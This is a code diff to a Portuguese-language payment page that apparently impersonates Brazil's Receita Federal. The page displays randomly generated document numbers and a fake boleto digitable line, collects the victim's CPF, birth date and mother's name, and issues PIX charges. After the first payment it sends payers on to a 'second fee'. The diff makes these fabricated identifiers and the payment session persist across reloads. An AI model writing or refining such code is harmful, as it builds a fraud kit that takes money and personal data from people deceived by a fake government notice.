@@ -476,7 +476,7 @@
         const cpf = "{{ cpf }}";
         const valor = "{{ valor }}";
         const cpfLimpo = String(cpf).replace(/\D/g, '');
-        
+
         const urlParams = new URLSearchParams(window.location.search);
         const level = parseInt(urlParams.get('level') || '1');
         let transactionId = null;
@@ -484,9 +484,34 @@
         let statusCheckInterval = null;
         let pixCopiado = false;
         let pagamentoConfirmado = false;
+        let verificacaoPopupInterval = null;
 
-        let STORAGE_KEY = '';
-        let PAID_KEY = '';
+        const SESSION_KEY = 'pix_session_' + cpfLimpo + '_level' + level;
+        const TIMER_DURATION = 40;
+
+        function salvarSessao(dados) {
+            var sessao = carregarSessao() || {};
+            for (var k in dados) { sessao[k] = dados[k]; }
+            try { localStorage.setItem(SESSION_KEY, JSON.stringify(sessao)); } catch(e) {}
+        }
+
+        function carregarSessao() {
+            try {
+                var raw = localStorage.getItem(SESSION_KEY);
+                if (!raw) return null;
+                var s = JSON.parse(raw);
+                var MAX_AGE = 2 * 60 * 60 * 1000;
+                if (s.createdAt && (Date.now() - s.createdAt > MAX_AGE)) {
+                    localStorage.removeItem(SESSION_KEY);
+                    return null;
+                }
+                return s;
+            } catch(e) { return null; }
+        }
+
+        function limparSessao() {
+            try { localStorage.removeItem(SESSION_KEY); } catch(e) {}
+        }
 
         function formatCPF(cpf) {
             const cpfClean = String(cpf).replace(/\D/g, '');
@@ -504,32 +529,49 @@
             return `${dia}/${mes}/${ano}`;
         }
 
+        function gerarOuRestaurar(key, gerador) {
+            var sessao = carregarSessao();
+            if (sessao && sessao[key]) return sessao[key];
+            var val = gerador();
+            var obj = {}; obj[key] = val;
+            salvarSessao(obj);
+            return val;
+        }
+
         function getNumeroDocumento() {
-            const r1 = Math.floor(Math.random() * 999).toString().padStart(3, '0');
-            const r2 = Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
-            return `${r1}/${r2}-8`;
+            return gerarOuRestaurar('numDoc', function() {
+                var r1 = Math.floor(Math.random() * 999).toString().padStart(3, '0');
+                var r2 = Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
+                return r1 + '/' + r2 + '-8';
+            });
         }
 
         function getNossoNumero() {
-            const r1 = Math.floor(Math.random() * 999).toString().padStart(3, '0');
-            const r2 = Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
-            return `${r1}/${r2}-4`;
+            return gerarOuRestaurar('nossoNum', function() {
+                var r1 = Math.floor(Math.random() * 999).toString().padStart(3, '0');
+                var r2 = Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
+                return r1 + '/' + r2 + '-4';
+            });
         }
 
         function getGuiaNumero() {
-            const r1 = Math.floor(Math.random() * 9999999).toString().padStart(7, '0');
-            const r2 = Math.floor(Math.random() * 99).toString().padStart(2, '0');
-            return `${r1}-${r2}/${r2}`;
+            return gerarOuRestaurar('guiaNum', function() {
+                var r1 = Math.floor(Math.random() * 9999999).toString().padStart(7, '0');
+                var r2 = Math.floor(Math.random() * 99).toString().padStart(2, '0');
+                return r1 + '-' + r2 + '/' + r2;
+            });
         }
 
         function getLinhaDigitavel() {
-            const p1 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
-            const p2 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
-            const p3 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
-            const p4 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
-            const p5 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
-            const p6 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
-            return `00190.${p1} ${p2}.${p3} ${p4}.${p5} 1 ${p6}14794`;
+            return gerarOuRestaurar('linhaDigit', function() {
+                var p1 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+                var p2 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+                var p3 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+                var p4 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
+                var p5 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+                var p6 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
+                return '00190.' + p1 + ' ' + p2 + '.' + p3 + ' ' + p4 + '.' + p5 + ' 1 ' + p6 + '14794';
+            });
         }
 
         function copyPixCode() {
@@ -538,10 +580,10 @@
                 const btn = document.getElementById('copy-btn');
                 btn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
                 btn.style.backgroundColor = '#059669';
-                
+
                 pixCopiado = true;
-                localStorage.setItem(STORAGE_KEY, 'true');
-                
+                salvarSessao({ pixCopiado: true });
+
                 setTimeout(() => {
                     btn.innerHTML = '<i class="fas fa-copy"></i> <span>Copiar Código PIX</span>';
                     btn.style.backgroundColor = '#1351B4';
@@ -558,7 +600,7 @@
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Verificando pagamento...</span>';
             btn.style.opacity = '0.85';
             btn.style.pointerEvents = 'none';
-            
+
             if (level === 2) {
                 setTimeout(function() {
                     btn.innerHTML = '<i class="fas fa-file-alt"></i> <span>Emitir Comprovante de Pagamento</span>';
@@ -568,6 +610,7 @@
                 }, 1200);
             } else {
                 setTimeout(function() {
+                    limparSessao();
                     redirecionarParaSegundaTaxa();
                 }, 1000);
             }
@@ -586,6 +629,8 @@
             const nascEnc = encodeURIComponent(nascimento);
             const maeEnc = encodeURIComponent(mae);
 
+            limparSessao();
+
             setTimeout(function() {
                 document.getElementById('popup-taxa').style.display = 'none';
                 rfbTransition('popup-loading-taxa', 'Processando solicitação...', [
@@ -597,7 +642,7 @@
 
         function exibirPix(codigo, qrBase64, qrUrl) {
             document.getElementById('pix-code').textContent = codigo;
-            
+
             const qrContainer = document.getElementById('qrcode-container');
             var qrSrc = '';
             if (qrBase64) {
@@ -608,7 +653,7 @@
                 qrSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=' + encodeURIComponent(codigo);
             }
             qrContainer.innerHTML = '<img src="' + qrSrc + '" alt="QR Code PIX" style="width: 160px; height: 160px;">';
-            
+
             iniciarVerificacaoStatus();
         }
 
@@ -635,7 +680,9 @@
             } else {
                 destino = '/extrato2?nome=' + nomeEnc + '&cpf=' + cpfEnc + '&nascimento=' + nascEnc + '&mae=' + maeEnc;
             }
-            
+
+            limparSessao();
+
             rfbTransition('popup-verificando', 'Verificando seu pagamento...', [
                 { at: 40, text: 'Confirmando pagamento...' },
                 { at: 70, text: 'Registrando no sistema...' },
@@ -645,16 +692,16 @@
 
         function mostrarPagamentoConfirmado() {
             const statusDiv = document.getElementById('status-container');
-            statusDiv.innerHTML = `
-                <div style="width: 12px; height: 12px; background: #22c55e; border-radius: 50%;"></div>
-                <span style="color: #22c55e; font-weight: bold;">Pagamento confirmado!</span>
-            `;
-            
+            statusDiv.innerHTML = '<div style="width: 12px; height: 12px; background: #22c55e; border-radius: 50%;"></div>' +
+                '<span style="color: #22c55e; font-weight: bold;">Pagamento confirmado!</span>';
+
             pagamentoConfirmado = true;
-            localStorage.setItem(PAID_KEY, 'true');
-            
+            salvarSessao({ status: 'PAID' });
+
             esconderPopupVerificando();
-            
+
+            document.getElementById('confirmar-section').style.display = 'block';
+
             if (level === 2) {
                 setTimeout(mostrarPopupTaxa, 1500);
             } else {
@@ -662,16 +709,16 @@
             }
         }
 
+        function statusPago(s) {
+            return s === 'PAID' || s === 'paid' || s === 'completed' || s === 'approved';
+        }
+
         async function verificarStatusUmaVez() {
             if (!transactionId) return null;
-            
             try {
-                const response = await fetch(`/api/pix/status/${transactionId}`);
+                const response = await fetch('/api/pix/status/' + transactionId);
                 const result = await response.json();
-                
-                if (result.success) {
-                    return result.status;
-                }
+                if (result.success) return result.status;
             } catch (error) {
                 console.error('Erro ao verificar status:', error);
             }
@@ -680,72 +727,61 @@
 
         function iniciarVerificacaoStatus() {
             if (!transactionId) return;
-            
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
+
             statusCheckInterval = setInterval(async () => {
                 const status = await verificarStatusUmaVez();
-                
-                if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
+                if (statusPago(status)) {
                     clearInterval(statusCheckInterval);
                     mostrarPagamentoConfirmado();
                 }
             }, 5000);
         }
 
-        async function verificarAoRetornar() {
-            const jaCopiou = localStorage.getItem(STORAGE_KEY) === 'true';
-            const jaPagou = localStorage.getItem(PAID_KEY) === 'true';
-            
-            if (jaPagou) {
-                if (level === 2) {
-                    mostrarPopupTaxa();
-                } else {
-                    redirecionarParaSegundaTaxa();
-                }
-                return;
-            }
-            
-            if (jaCopiou && transactionId) {
-                mostrarPopupVerificando();
-                
-                const status = await verificarStatusUmaVez();
-                
-                if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
-                    mostrarPagamentoConfirmado();
-                } else {
-                    iniciarVerificacaoComPopup();
-                }
-            }
-        }
-
-        let verificacaoPopupInterval = null;
-        
         function iniciarVerificacaoComPopup() {
             if (verificacaoPopupInterval) clearInterval(verificacaoPopupInterval);
-            
             verificacaoPopupInterval = setInterval(async () => {
                 const status = await verificarStatusUmaVez();
-                
-                if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
+                if (statusPago(status)) {
                     clearInterval(verificacaoPopupInterval);
                     mostrarPagamentoConfirmado();
                 }
             }, 5000);
         }
-        
+
+        function iniciarTimerComprovante(startTime) {
+            var elapsed = Math.floor((Date.now() - startTime) / 1000);
+            var remaining = TIMER_DURATION - elapsed;
+
+            if (remaining <= 0) {
+                if (!pagamentoConfirmado) {
+                    document.getElementById('confirmar-section').style.display = 'block';
+                }
+                return;
+            }
+
+            setTimeout(function() {
+                if (!pagamentoConfirmado) {
+                    document.getElementById('confirmar-section').style.display = 'block';
+                }
+            }, remaining * 1000);
+        }
+
         document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible') {
-                const jaCopiou = localStorage.getItem(STORAGE_KEY) === 'true';
-                
-                if (jaCopiou && transactionId && !pagamentoConfirmado) {
-                    mostrarPopupVerificando();
-                    
-                    const status = await verificarStatusUmaVez();
-                    
-                    if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
-                        mostrarPagamentoConfirmado();
-                    } else {
-                        iniciarVerificacaoComPopup();
-                    }
+            if (document.visibilityState === 'visible' && transactionId && !pagamentoConfirmado) {
+                var sessao = carregarSessao();
+                if (sessao && sessao.status === 'PAID') {
+                    mostrarPagamentoConfirmado();
+                    return;
+                }
+
+                mostrarPopupVerificando();
+                const status = await verificarStatusUmaVez();
+                if (statusPago(status)) {
+                    mostrarPagamentoConfirmado();
+                } else {
+                    esconderPopupVerificando();
+                    iniciarVerificacaoStatus();
                 }
             }
         });
@@ -770,8 +806,16 @@
                 if (result.success && result.pix_code) {
                     transactionId = result.transaction_id;
                     pixCode = result.pix_code;
-                    STORAGE_KEY = 'pix_copiado_' + transactionId;
-                    PAID_KEY = 'pix_paid_' + transactionId;
+
+                    salvarSessao({
+                        transactionId: transactionId,
+                        pixCode: pixCode,
+                        qrBase64: result.qr_code_base64 || '',
+                        qrUrl: result.qr_code_url || '',
+                        createdAt: Date.now(),
+                        status: 'PENDING'
+                    });
+
                     exibirPix(pixCode, result.qr_code_base64 || '', result.qr_code_url || '');
                 } else {
                     document.getElementById('pix-code').textContent = 'Erro ao gerar PIX. Tente novamente.';
@@ -785,7 +829,7 @@
 
         document.addEventListener('DOMContentLoaded', async function() {
             const dataHoje = getDataHoje();
-            
+
             document.getElementById('cpf-pagador').textContent = formatCPF(cpf);
             document.getElementById('data-documento').textContent = dataHoje;
             document.getElementById('data-processamento').textContent = dataHoje;
@@ -796,13 +840,36 @@
             document.getElementById('data-vencimento-2').textContent = dataHoje;
             document.getElementById('linha-digitavel').textContent = getLinhaDigitavel();
 
-            await gerarPix();
+            var sessao = carregarSessao();
 
-            setTimeout(function() {
-                if (!pagamentoConfirmado) {
-                    document.getElementById('confirmar-section').style.display = 'block';
+            if (sessao && sessao.transactionId) {
+                transactionId = sessao.transactionId;
+                pixCode = sessao.pixCode || '';
+
+                if (sessao.status === 'PAID') {
+                    if (pixCode) exibirPix(pixCode, sessao.qrBase64 || '', sessao.qrUrl || '');
+                    mostrarPagamentoConfirmado();
+                    return;
                 }
-            }, 40000);
+
+                if (pixCode) {
+                    exibirPix(pixCode, sessao.qrBase64 || '', sessao.qrUrl || '');
+                }
+
+                var startTime = sessao.createdAt || Date.now();
+                iniciarTimerComprovante(startTime);
+
+                const status = await verificarStatusUmaVez();
+                if (statusPago(status)) {
+                    mostrarPagamentoConfirmado();
+                    return;
+                }
+
+                iniciarVerificacaoStatus();
+            } else {
+                await gerarPix();
+                iniciarTimerComprovante(Date.now());
+            }
         });
     </script>
     <script src="/static/rfb-header.js"></script>
